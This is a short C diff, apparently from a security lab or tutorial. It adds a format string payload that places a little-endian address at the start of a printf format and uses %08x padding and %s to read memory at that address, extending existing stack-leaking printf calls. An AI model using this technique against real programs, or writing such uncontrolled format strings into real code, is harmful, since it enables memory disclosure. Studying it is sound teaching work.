@@ -19,4 +19,7 @@ int main () {
     printf("%08x.%08x.%08x.%08x.%08x\n");
     printf("\n");
 
+  // View a arbitrary address including %s. In this case: 0x08480110 (little endian)
+  printf("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");
+  
 }
